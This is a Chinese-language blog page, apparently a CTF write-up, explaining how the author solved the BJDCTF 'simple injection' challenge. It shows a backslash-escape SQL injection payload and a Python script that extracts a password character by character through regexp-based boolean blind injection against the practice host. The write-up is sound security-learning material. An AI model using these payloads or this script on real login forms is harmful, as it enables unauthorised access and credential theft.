@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="首先，在robots下发现hint，hint中有对sql语句的提示。  然后通过向上帝祈祷，得到源码：  源码中可以看到，他过滤了很多东西，包括双引号select 和union联合查询等等。再次祈祷，上帝说没有过滤反斜杠，于是测试之：username&#x3D;adminpassword&#x3D;or 1 页面返回不一样了，说明从数据库读到什么东西：  然而并没有什么用，BJD needs to be strong">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF 简单注入 (regexp盲注)">
+<meta property="og:url" content="https://x1a0.net/2020/03/26/76/index.html">
+<meta property="og:site_name" content="XiaoYue">
+<meta property="og:description" content="首先，在robots下发现hint，hint中有对sql语句的提示。  然后通过向上帝祈祷，得到源码：  源码中可以看到，他过滤了很多东西，包括双引号select 和union联合查询等等。再次祈祷，上帝说没有过滤反斜杠，于是测试之：username&#x3D;adminpassword&#x3D;or 1 页面返回不一样了，说明从数据库读到什么东西：  然而并没有什么用，BJD needs to be strong">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://oss.x1a0.net/image/2020/03/26/661613296083493/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326035528.png">
+<meta property="og:image" content="https://oss.x1a0.net/image/2020/03/26/662684245324092/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326035719.png">
+<meta property="og:image" content="https://oss.x1a0.net/image/2020/03/26/664541639670767/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326040040.png">
+<meta property="og:image" content="https://oss.x1a0.net/image/2020/03/26/670141030806310/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326041005.png">
+<meta property="og:image" content="https://oss.x1a0.net/image/2020/03/26/685923229688970/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326043551.png">
+<meta property="article:published_time" content="2020-03-25T19:56:00.000Z">
+<meta property="article:modified_time" content="2020-04-17T12:44:20.000Z">
+<meta property="article:author" content="肖越">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oss.x1a0.net/image/2020/03/26/661613296083493/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326035528.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BJDCTF 简单注入 (regexp盲注)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="XiaoYue" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/xiaoyue2019">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2020/03/26/91/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2020/03/26/74/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://x1a0.net/2020/03/26/76/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://x1a0.net/2020/03/26/76/&text=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://x1a0.net/2020/03/26/76/&is_video=false&description=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BJDCTF 简单注入 (regexp盲注)&body=Check out this article: https://x1a0.net/2020/03/26/76/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://x1a0.net/2020/03/26/76/&name=BJDCTF 简单注入 (regexp盲注)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://x1a0.net/2020/03/26/76/&t=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BJDCTF 简单注入 (regexp盲注)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">肖越</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-25T19:56:00.000Z" itemprop="datePublished">2020-03-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>首先，在robots下发现hint，<br>hint中有对sql语句的提示。<br><img src="https://oss.x1a0.net/image/2020/03/26/661613296083493/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326035528.png" alt="微信截图_20200326035528.png"></p>
+<hr>
+<p>然后通过向上帝祈祷，得到源码：<br><img src="https://oss.x1a0.net/image/2020/03/26/662684245324092/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326035719.png" alt="微信截图_20200326035719.png"></p>
+<hr>
+<p>源码中可以看到，他过滤了很多东西，包括双引号select 和union联合查询等等。<br>再次祈祷，上帝说没有过滤反斜杠，于是测试之：<br>username=admin<br>password=or 1</p>
+<p>页面返回不一样了，说明从数据库读到什么东西：<br><img src="https://oss.x1a0.net/image/2020/03/26/664541639670767/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326040040.png" alt="微信截图_20200326040040.png"></p>
+<hr>
+<p>然而并没有什么用，<br>BJD needs to be stronger<br>我觉得我很强壮啊。<br>通过翻看向上帝乞讨的源码知道，当他从数据库中读取到东西的时候，就说BJD需要强壮。说明这是个布尔盲注，我们只能晓得正确或者错误（错误就是You konw ,P3rh4ps needs a girl friend），说明需要女朋友就报错，他应该要单一段时间了。</p>
+<p>然后再再次向上帝祈祷，他说这是regexp注入。但是并不知道password字段名是啥啊，难道就是password吗。虽然很随意，但是确实是。。</p>
+<p>于是构造：<br>username=notgirl<br>password=or password regexp hex(^[a-zA-Z0-9])<br>就拿上帝视角的密码来说：OhyOuFOuNdit<br>password=or password regexp hex(^O)# –&gt;password=or password regexp 0x5E4F<br>因为在mysql中传入hex他会自动解析成str格式，因为过滤了引号，所以这么干。（我猜的）<br><img src="https://oss.x1a0.net/image/2020/03/26/670141030806310/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326041005.png" alt="微信截图_20200326041005.png"></p>
+<hr>
+<p>然后这个时候返回的是我很强壮。就说明查到数据了。那么写个脚本判断[a-zA-Z0-9]（为什么不能有特殊字符，淦<strong>mark</strong>）把有他需要女朋友这种回显的页面全部去掉，当返回我很强壮的时候（说明查到数据了）就把当前字符记录下来。</p>
+<p>小jo本：</p>
+<pre><code>import binascii,requests
+
+url=&#39;http://40861019-e34a-4cba-906a-d0ad5ddb6e49.node3.buuoj.cn/index.php&#39;
+key=&#39;&#39;
+
+
+while 1:
+    
+    for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;:
+        _=&#39;^&#39;+key+i
+        data=&#123;
+            &#39;username&#39;:&#39;younotgf!\\&#39;,
+            &#39;password&#39;:&#39;or password regexp binary 0x&#123;&#125;# &#39;.format(binascii.b2a_hex(_.encode()).decode())
+        &#125;
+        
+        res=requests.post(url,data=data).text
+        if &#39;stronger&#39; in res:
+            key+=i
+            print(key)
+            break
+</code></pre>
+<p><img src="https://oss.x1a0.net/image/2020/03/26/685923229688970/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200326043551.png" alt="微信截图_20200326043551.png"></p>
+<p>然后登陆之（tools可以扩充个str2hex双向转换的小脚本<strong>Mark</strong>）</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/xiaoyue2019">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://x1a0.net/2020/03/26/76/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://x1a0.net/2020/03/26/76/&text=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://x1a0.net/2020/03/26/76/&is_video=false&description=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BJDCTF 简单注入 (regexp盲注)&body=Check out this article: https://x1a0.net/2020/03/26/76/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://x1a0.net/2020/03/26/76/&title=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://x1a0.net/2020/03/26/76/&name=BJDCTF 简单注入 (regexp盲注)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://x1a0.net/2020/03/26/76/&t=BJDCTF 简单注入 (regexp盲注)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    肖越
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/xiaoyue2019">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
